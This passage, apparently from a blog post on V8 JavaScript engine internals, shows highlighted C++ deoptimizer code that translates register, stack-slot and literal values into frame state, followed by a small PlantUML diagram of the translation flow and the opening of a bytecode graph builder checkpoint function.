</span></span><span style="display:flex;"><span>          TranslatedValue<span style="color:#f92672">::</span>NewDeferredObject(<span style="color:#66d9ef">this</span>, field_count, object_index);
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>REGISTER: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> input_reg <span style="color:#f92672">=</span> iterator<span style="color:#f92672">-&gt;</span>Next();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (registers <span style="color:#f92672">==</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        TranslatedValue translated_value <span style="color:#f92672">=</span> TranslatedValue<span style="color:#f92672">::</span>NewInvalid(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>        frame.Add(translated_value);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      intptr_t value <span style="color:#f92672">=</span> registers<span style="color:#f92672">-&gt;</span>GetRegister(input_reg);
</span></span><span style="display:flex;"><span>      Address uncompressed_value <span style="color:#f92672">=</span> DecompressIfNeeded(value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, V8PRIxPTR_FMT <span style="color:#e6db74">&#34; ; %s &#34;</span>, uncompressed_value,
</span></span><span style="display:flex;"><span>               converter.NameOfCPURegister(input_reg));
</span></span><span style="display:flex;"><span>        Object(uncompressed_value).ShortPrint(trace_file);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          TranslatedValue<span style="color:#f92672">::</span>NewTagged(<span style="color:#66d9ef">this</span>, Object(uncompressed_value));
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>INT32_REGISTER: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> input_reg <span style="color:#f92672">=</span> iterator<span style="color:#f92672">-&gt;</span>Next();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (registers <span style="color:#f92672">==</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        TranslatedValue translated_value <span style="color:#f92672">=</span> TranslatedValue<span style="color:#f92672">::</span>NewInvalid(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>        frame.Add(translated_value);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      intptr_t value <span style="color:#f92672">=</span> registers<span style="color:#f92672">-&gt;</span>GetRegister(input_reg);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;%&#34;</span> V8PRIdPTR <span style="color:#e6db74">&#34; ; %s (int32)&#34;</span>, value,
</span></span><span style="display:flex;"><span>               converter.NameOfCPURegister(input_reg));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          TranslatedValue<span style="color:#f92672">::</span>NewInt32(<span style="color:#66d9ef">this</span>, <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int32_t</span><span style="color:#f92672">&gt;</span>(value));
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>INT64_REGISTER: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> input_reg <span style="color:#f92672">=</span> iterator<span style="color:#f92672">-&gt;</span>Next();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (registers <span style="color:#f92672">==</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        TranslatedValue translated_value <span style="color:#f92672">=</span> TranslatedValue<span style="color:#f92672">::</span>NewInvalid(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>        frame.Add(translated_value);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      intptr_t value <span style="color:#f92672">=</span> registers<span style="color:#f92672">-&gt;</span>GetRegister(input_reg);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;%&#34;</span> V8PRIdPTR <span style="color:#e6db74">&#34; ; %s (int64)&#34;</span>, value,
</span></span><span style="display:flex;"><span>               converter.NameOfCPURegister(input_reg));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          TranslatedValue<span style="color:#f92672">::</span>NewInt64(<span style="color:#66d9ef">this</span>, <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int64_t</span><span style="color:#f92672">&gt;</span>(value));
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>UINT32_REGISTER: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> input_reg <span style="color:#f92672">=</span> iterator<span style="color:#f92672">-&gt;</span>Next();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (registers <span style="color:#f92672">==</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        TranslatedValue translated_value <span style="color:#f92672">=</span> TranslatedValue<span style="color:#f92672">::</span>NewInvalid(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>        frame.Add(translated_value);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      intptr_t value <span style="color:#f92672">=</span> registers<span style="color:#f92672">-&gt;</span>GetRegister(input_reg);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;%&#34;</span> V8PRIuPTR <span style="color:#e6db74">&#34; ; %s (uint32)&#34;</span>, value,
</span></span><span style="display:flex;"><span>               converter.NameOfCPURegister(input_reg));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          TranslatedValue<span style="color:#f92672">::</span>NewUInt32(<span style="color:#66d9ef">this</span>, <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">&gt;</span>(value));
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>BOOL_REGISTER: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> input_reg <span style="color:#f92672">=</span> iterator<span style="color:#f92672">-&gt;</span>Next();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (registers <span style="color:#f92672">==</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        TranslatedValue translated_value <span style="color:#f92672">=</span> TranslatedValue<span style="color:#f92672">::</span>NewInvalid(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>        frame.Add(translated_value);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      intptr_t value <span style="color:#f92672">=</span> registers<span style="color:#f92672">-&gt;</span>GetRegister(input_reg);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;%&#34;</span> V8PRIdPTR <span style="color:#e6db74">&#34; ; %s (bool)&#34;</span>, value,
</span></span><span style="display:flex;"><span>               converter.NameOfCPURegister(input_reg));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          TranslatedValue<span style="color:#f92672">::</span>NewBool(<span style="color:#66d9ef">this</span>, <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">&gt;</span>(value));
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>FLOAT_REGISTER: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> input_reg <span style="color:#f92672">=</span> iterator<span style="color:#f92672">-&gt;</span>Next();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (registers <span style="color:#f92672">==</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        TranslatedValue translated_value <span style="color:#f92672">=</span> TranslatedValue<span style="color:#f92672">::</span>NewInvalid(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>        frame.Add(translated_value);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      Float32 value <span style="color:#f92672">=</span> registers<span style="color:#f92672">-&gt;</span>GetFloatRegister(input_reg);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;%e ; %s (float)&#34;</span>, value.get_scalar(),
</span></span><span style="display:flex;"><span>               RegisterName(FloatRegister<span style="color:#f92672">::</span>from_code(input_reg)));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span> TranslatedValue<span style="color:#f92672">::</span>NewFloat(<span style="color:#66d9ef">this</span>, value);
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>DOUBLE_REGISTER: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> input_reg <span style="color:#f92672">=</span> iterator<span style="color:#f92672">-&gt;</span>Next();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (registers <span style="color:#f92672">==</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        TranslatedValue translated_value <span style="color:#f92672">=</span> TranslatedValue<span style="color:#f92672">::</span>NewInvalid(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>        frame.Add(translated_value);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      Float64 value <span style="color:#f92672">=</span> registers<span style="color:#f92672">-&gt;</span>GetDoubleRegister(input_reg);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;%e ; %s (double)&#34;</span>, value.get_scalar(),
</span></span><span style="display:flex;"><span>               RegisterName(DoubleRegister<span style="color:#f92672">::</span>from_code(input_reg)));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          TranslatedValue<span style="color:#f92672">::</span>NewDouble(<span style="color:#66d9ef">this</span>, value);
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>STACK_SLOT: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> slot_offset <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          OptimizedFrame<span style="color:#f92672">::</span>StackSlotOffsetRelativeToFp(iterator<span style="color:#f92672">-&gt;</span>Next());
</span></span><span style="display:flex;"><span>      intptr_t value <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span>intptr_t<span style="color:#f92672">*&gt;</span>(fp <span style="color:#f92672">+</span> slot_offset));
</span></span><span style="display:flex;"><span>      Address uncompressed_value <span style="color:#f92672">=</span> DecompressIfNeeded(value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, V8PRIxPTR_FMT <span style="color:#e6db74">&#34; ;  [fp %c %3d]  &#34;</span>,
</span></span><span style="display:flex;"><span>               uncompressed_value, slot_offset <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;+&#39;</span>,
</span></span><span style="display:flex;"><span>               std<span style="color:#f92672">::</span>abs(slot_offset));
</span></span><span style="display:flex;"><span>        Object(uncompressed_value).ShortPrint(trace_file);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          TranslatedValue<span style="color:#f92672">::</span>NewTagged(<span style="color:#66d9ef">this</span>, Object(uncompressed_value));
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>INT32_STACK_SLOT: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> slot_offset <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          OptimizedFrame<span style="color:#f92672">::</span>StackSlotOffsetRelativeToFp(iterator<span style="color:#f92672">-&gt;</span>Next());
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">uint32_t</span> value <span style="color:#f92672">=</span> GetUInt32Slot(fp, slot_offset);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;%d ; (int32) [fp %c %3d] &#34;</span>,
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int32_t</span><span style="color:#f92672">&gt;</span>(value), slot_offset <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;+&#39;</span>,
</span></span><span style="display:flex;"><span>               std<span style="color:#f92672">::</span>abs(slot_offset));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span> TranslatedValue<span style="color:#f92672">::</span>NewInt32(<span style="color:#66d9ef">this</span>, value);
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>INT64_STACK_SLOT: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> slot_offset <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          OptimizedFrame<span style="color:#f92672">::</span>StackSlotOffsetRelativeToFp(iterator<span style="color:#f92672">-&gt;</span>Next());
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">uint64_t</span> value <span style="color:#f92672">=</span> GetUInt64Slot(fp, slot_offset);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;%&#34;</span> V8PRIdPTR <span style="color:#e6db74">&#34; ; (int64) [fp %c %3d] &#34;</span>,
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span>intptr_t<span style="color:#f92672">&gt;</span>(value), slot_offset <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;+&#39;</span>,
</span></span><span style="display:flex;"><span>               std<span style="color:#f92672">::</span>abs(slot_offset));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span> TranslatedValue<span style="color:#f92672">::</span>NewInt64(<span style="color:#66d9ef">this</span>, value);
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>UINT32_STACK_SLOT: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> slot_offset <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          OptimizedFrame<span style="color:#f92672">::</span>StackSlotOffsetRelativeToFp(iterator<span style="color:#f92672">-&gt;</span>Next());
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">uint32_t</span> value <span style="color:#f92672">=</span> GetUInt32Slot(fp, slot_offset);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;%u ; (uint32) [fp %c %3d] &#34;</span>, value,
</span></span><span style="display:flex;"><span>               slot_offset <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;+&#39;</span>, std<span style="color:#f92672">::</span>abs(slot_offset));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          TranslatedValue<span style="color:#f92672">::</span>NewUInt32(<span style="color:#66d9ef">this</span>, value);
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>BOOL_STACK_SLOT: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> slot_offset <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          OptimizedFrame<span style="color:#f92672">::</span>StackSlotOffsetRelativeToFp(iterator<span style="color:#f92672">-&gt;</span>Next());
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">uint32_t</span> value <span style="color:#f92672">=</span> GetUInt32Slot(fp, slot_offset);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;%u ; (bool) [fp %c %3d] &#34;</span>, value,
</span></span><span style="display:flex;"><span>               slot_offset <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;+&#39;</span>, std<span style="color:#f92672">::</span>abs(slot_offset));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span> TranslatedValue<span style="color:#f92672">::</span>NewBool(<span style="color:#66d9ef">this</span>, value);
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>FLOAT_STACK_SLOT: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> slot_offset <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          OptimizedFrame<span style="color:#f92672">::</span>StackSlotOffsetRelativeToFp(iterator<span style="color:#f92672">-&gt;</span>Next());
</span></span><span style="display:flex;"><span>      Float32 value <span style="color:#f92672">=</span> GetFloatSlot(fp, slot_offset);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;%e ; (float) [fp %c %3d] &#34;</span>, value.get_scalar(),
</span></span><span style="display:flex;"><span>               slot_offset <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;+&#39;</span>, std<span style="color:#f92672">::</span>abs(slot_offset));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span> TranslatedValue<span style="color:#f92672">::</span>NewFloat(<span style="color:#66d9ef">this</span>, value);
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>DOUBLE_STACK_SLOT: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> slot_offset <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          OptimizedFrame<span style="color:#f92672">::</span>StackSlotOffsetRelativeToFp(iterator<span style="color:#f92672">-&gt;</span>Next());
</span></span><span style="display:flex;"><span>      Float64 value <span style="color:#f92672">=</span> GetDoubleSlot(fp, slot_offset);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, <span style="color:#e6db74">&#34;%e ; (double) [fp %c %d] &#34;</span>, value.get_scalar(),
</span></span><span style="display:flex;"><span>               slot_offset <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;+&#39;</span>, std<span style="color:#f92672">::</span>abs(slot_offset));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          TranslatedValue<span style="color:#f92672">::</span>NewDouble(<span style="color:#66d9ef">this</span>, value);
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TranslationOpcode<span style="color:#f92672">::</span>LITERAL: {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> literal_index <span style="color:#f92672">=</span> iterator<span style="color:#f92672">-&gt;</span>Next();
</span></span><span style="display:flex;"><span>      Object value <span style="color:#f92672">=</span> literal_array.get(literal_index);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (trace_file <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>        PrintF(trace_file, V8PRIxPTR_FMT <span style="color:#e6db74">&#34; ; (literal %2d) &#34;</span>, value.ptr(),
</span></span><span style="display:flex;"><span>               literal_index);
</span></span><span style="display:flex;"><span>        value.ShortPrint(trace_file);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      TranslatedValue translated_value <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          TranslatedValue<span style="color:#f92672">::</span>NewTagged(<span style="color:#66d9ef">this</span>, value);
</span></span><span style="display:flex;"><span>      frame.Add(translated_value);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> translated_value.GetChildrenCount();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  FATAL(<span style="color:#e6db74">&#34;We should never get here - unexpected deopt info.&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><pre tabindex="0"><code class="language-plantuml" data-lang="plantuml">@startuml
skinparam handwritten true
[FrameState] -&gt; [FrameDescriptor] : AppendDeoptimizeArguments
[FrameDescriptor] -&gt; [TranslationArray] : TranslateFrameStateDescriptorOperands
[TramslationArray] -&gt; [JavascriptFrameSummary] : OptimizedFrame::Summarize
@enduml
</code></pre><p>StateValues</p>
<p>bitmask_</p>
<p>Environment::Checkpoint()</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-CPP" data-lang="CPP"><span style="display:flex;"><span>Node<span style="color:#f92672">*</span> BytecodeGraphBuilder<span style="color:#f92672">::</span>Environment<span style="color:#f92672">::</span>Checkpoint(
</span></span><span style="display:flex;"><span>    BytecodeOffset bailout_id, OutputFrameStateCombine combine,
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> BytecodeLivenessState<span style="color:#f92672">*</span> liveness) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (parameter_count() <span style="color:#f92672">==</span> register_count()) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Re-use the state-value cache if the number of local registers happens
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// to match the parameter count.
